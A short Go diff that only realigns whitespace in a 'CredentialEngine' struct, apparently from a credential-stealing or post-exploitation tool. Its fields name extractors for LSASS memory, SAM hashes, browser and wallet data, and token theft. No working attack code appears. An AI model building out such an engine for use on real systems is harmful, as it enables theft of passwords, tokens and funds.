@@ -10,15 +10,15 @@ import (
 )
 
 type CredentialEngine struct {
-	config         *CredentialConfig
-	log            *logger.Logger
-	mu             sync.RWMutex
-	lsassExtractors map[LSASSMethod]LSASSExtractor
-	samExtractors   map[SAMMethod]SAMExtractor
+	config            *CredentialConfig
+	log               *logger.Logger
+	mu                sync.RWMutex
+	lsassExtractors   map[LSASSMethod]LSASSExtractor
+	samExtractors     map[SAMMethod]SAMExtractor
 	browserExtractors map[BrowserType]BrowserExtractor
-	walletExtractors map[WalletType]WalletExtractor
-	tokenThieves    map[TokenMethod]TokenThief
-	harvested       []*CredentialHarvest
+	walletExtractors  map[WalletType]WalletExtractor
+	tokenThieves      map[TokenMethod]TokenThief
+	harvested         []*CredentialHarvest
 }
 
 func NewCredentialEngine(config *CredentialConfig) *CredentialEngine {
